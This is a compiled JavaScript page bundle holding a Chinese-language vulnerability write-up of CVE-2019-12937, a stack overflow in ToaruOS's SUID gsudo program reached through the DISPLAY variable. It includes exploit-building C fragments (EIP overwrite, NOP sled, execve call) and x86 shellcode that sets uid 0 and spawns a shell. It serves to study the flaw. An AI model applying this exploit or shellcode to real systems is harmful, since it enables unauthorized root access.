(window.webpackJsonp=window.webpackJsonp||[]).push([[8],{311:function(t,a,e){t.exports=e.p+"assets/img/toaruos-suid.1eaa35c0.png"},312:function(t,a,e){t.exports=e.p+"assets/img/toaruos-argv.9dc0b972.png"},313:function(t,a,e){t.exports=e.p+"assets/img/toaruos-shell.9f8c3354.png"},347:function(t,a,e){"use strict";e.r(a);var s=[function(){var t=this,a=t.$createElement,s=t._self._c||a;return s("div",{staticClass:"content"},[s("h2",{attrs:{id:"cve-2019-12937-toaruos-提权漏洞分析"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#cve-2019-12937-toaruos-提权漏洞分析","aria-hidden":"true"}},[t._v("#")]),t._v(" CVE-2019-12937 ToaruOS 提权漏洞分析")]),t._v(" "),s("p",[t._v("ToaruOS是一套使用C语言编写的开源计算机操作系统，是一个由伊利诺伊大学计算机科学本科生开发的业余爱好操作系统。ToAruOS可在POSIX和x86架构上运行。ToAruOS的主要功能包括对进程和线程的支持、ELF二进制的支持、运行时加载模块、管道（Pipe）和各种类型的终端设备（TTY）的支持、虚拟文件系统的支持、EXT2文件系统的支持、信号量支持等。")]),t._v(" "),s("p",[t._v("ToaruOS 1.10.9及之前版本中的gsudo的apps/gsudo.c文件存在缓冲区溢出漏洞。攻击者可借助DISPLAY环境变量利用该漏洞将权限提升至root。")]),t._v(" "),s("h2",{attrs:{id:"漏洞触发位置"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞触发位置","aria-hidden":"true"}},[t._v("#")]),t._v(" 漏洞触发位置")]),t._v(" "),s("p",[t._v("在pex_connect函数使用sprintf拼接字符串，但是没有判断参数target的长度，当target太长时造成了栈溢出。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('FILE * pex_connect(char * target) {\n\tchar tmp[100];\n\tsprintf(tmp, "/dev/pex/%s", target);\n\tFILE * out = fopen(tmp, "r+");\n\tif (out) {\n\t\tsetbuf(out, NULL);\n\t}\n\treturn out;\n}\n')])])]),s("p",[t._v("其中参数target是环境变量DISPLAY的值。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('yutani_t * yutani_init(void) {\n\tchar * server_name = getenv("DISPLAY");\n\tif (!server_name) {\n\t\tserver_name = "compositor";\n\t}\n\tFILE * c = pex_connect(server_name);\n\n\tif (!c) {\n\t\treturn NULL; /* Connection failed. */\n\t}\n    ......\n    ......\n}\n')])])]),s("p",[t._v("在gsudo程序调用了yutani_init 函数。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("int main(int argc, char ** argv) {\n\n        if (argc < 2) {\n                return 1;\n        }\n\n        yctx = yutani_init();\n\t....\n\t....\n}\n")])])]),s("p",[t._v("gsudo是一个拥有SUID权限的程序，所以gsudo执行时的权限是root，可以利用上面的溢出来提权。")]),t._v(" "),s("h2",{attrs:{id:"suid"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#suid","aria-hidden":"true"}},[t._v("#")]),t._v(" SUID")]),t._v(" "),s("p",[t._v("SUID程序会创建s与t权限，是为了让一般用户在执行某些程序的时候，能够暂时具有该程序拥有者的权限。")]),t._v(" "),s("p",[t._v("下面测试一下SUID程序执行的过程。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('#include <stdio.h>\nvoid main()\n{\n        int res;\n        res = setuid(0);\n        printf("%d\\n", res);\n        system("/bin/sh");\n}\n')])])]),s("p",[t._v("setuid函数用来设置当前用户的身份，当参数为0，设置当前进程为root。在调用setuid之后，执行shell程序，观察当前用户。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("test@ubuntu:~/test$ gcc -o setid setid.c  -w\ntest@ubuntu:~/test$ ./setid\n-1\n$ id\nuid=1000(test) gid=1000(test) groups=1000(test),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)\n$ exit\ntest@ubuntu:~/test$ sudo chown root  setid\ntest@ubuntu:~/test$ sudo chmod u+s ./setid\ntest@ubuntu:~/test$ ./setid\n0\n# id\nuid=0(root) gid=1000(test) groups=1000(test),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)\n# exit\ntest@ubuntu:~/test$ ls -all ./setid\n-rwsrwxr-x 1 root test 8392 Jul  7 19:57 ./setid\n")])])]),s("p",[t._v("在ToaruOS中，操作系统启动完成后，所有程序都通过执行fork到exec_elf加载，程序的权限是父进程的权限。当遇到程序具有setuid权限，设置进程权限为当前文件拥有者权限。下图为ToaruOS源码中设置SUID程序权限的操作。")]),t._v(" "),s("p",[s("img",{attrs:{src:e(311),alt:"avatar"}})]),t._v(" "),s("h2",{attrs:{id:"漏洞利用"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞利用","aria-hidden":"true"}},[t._v("#")]),t._v(" 漏洞利用")]),t._v(" "),s("p",[t._v("此次溢出的程序发生在一个拥有SUID权限的程序，所以利用栈溢出可以进行提权操作。")]),t._v(" "),s("p",[t._v("ToaruOS中没有栈随机、堆随机、栈不可执行等等，这些保护机制，利用起来相当简单，但是也没有gdb一些调试工具，还是要费点心思。")]),t._v(" "),s("p",[t._v('通过栈溢出漏洞控制eip到我们的提权payload地址。栈上可以执行代码，栈地址也是固定的，我们通过argv变量把payload放到栈上。argv的地址直接printf("%x\\n", argv) 打印出来。')]),t._v(" "),s("p",[s("img",{attrs:{src:e(312),alt:"avatar"}})]),t._v(" "),s("p",[t._v("设置环境变量的值，控制eip值到argv地址，argv地址不能出现\\x00字符，通过填充Nop指令绕过。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('        #define EIP          "\\x0c\\xc0\\x01\\x3f"\n        char vector[8192]   = "DISPLAY=AAA";\n        char * const env[3] = { "aa", vector, NULL };\n        for (unsigned int i = 0; i < 26; i++)\n                strcat(vector, EIP);\n\n')])])]),s("p",[t._v("payload通过arg传递")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("        char payload[85536];\n        char * const arg[3] = { payload, \"ls\", NULL };\n\n        memset(payload, '\\x90', sizeof(payload) - shellcode_length - 1);\n        payload[sizeof(payload) - shellcode_length - 1] = 0;\n        strcat(payload, shellcode);\n")])])]),s("p",[t._v("执行gsudo")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('execve("/bin/gsudo", arg, env);\n')])])]),s("h2",{attrs:{id:"payload"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#payload","aria-hidden":"true"}},[t._v("#")]),t._v(" payload")]),t._v(" "),s("p",[t._v("在payload 首先执行setuid(0)设置当前进程权限，然后执行system(/bin/shh)返回shell。toaruOS通过int 0x7f调用系统函数，在syscall_nums.h中有系统调用号，setuid对应24，system对应7。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('    xor eax, eax\n    add al, 24\n    xor ebx, ebx\n    int 0x7f\n    jmp short end\nstart:\n    pop ebx\n    xor eax, eax\n    mov [ebx+7], al\n    mov [ebx+8], ebx\n    mov [ebx+12], eax\n    add al, 7\n    lea ecx, [ebx+8]\n    lea edx, [ebx+12]\n    int 0x7f\n    xor eax, eax\n    int 0x7f\nend:\n    call start\ndb "/bin/shh"\ndb "XXXXXXXX"\n')])])]),s("p",[s("img",{attrs:{src:e(313),alt:"avatar"}})])])}],n=e(1),r=Object(n.a)({},function(){this.$createElement;this._self._c;return this._m(0)},s,!1,null,null,null);a.default=r.exports}}]);